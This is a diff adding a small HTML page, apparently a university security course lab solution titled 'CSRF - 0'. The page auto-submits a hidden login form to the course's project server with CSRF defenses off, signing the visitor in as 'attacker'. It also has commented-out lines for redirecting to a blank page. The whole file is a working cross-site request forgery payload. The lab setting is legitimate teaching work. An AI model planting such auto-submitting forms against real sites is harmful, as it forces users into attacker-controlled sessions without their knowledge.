@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CSRF - 0</title>
+</head>
+
+<body>
+	<form method="POST" action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4">
+  <input type="text" name="username" value="attacker" />
+  <input type="password" name="password" value="l33th4x" />
+</form>
+<script>
+	document.forms[0].submit();
+   	//window.location.replace("about:blank")
+	//location.href="about:blank";
+	//window.open("blank_page.html", "_self");
+	//location.replace("about:blank");
+</script>
+</body>
+</html>
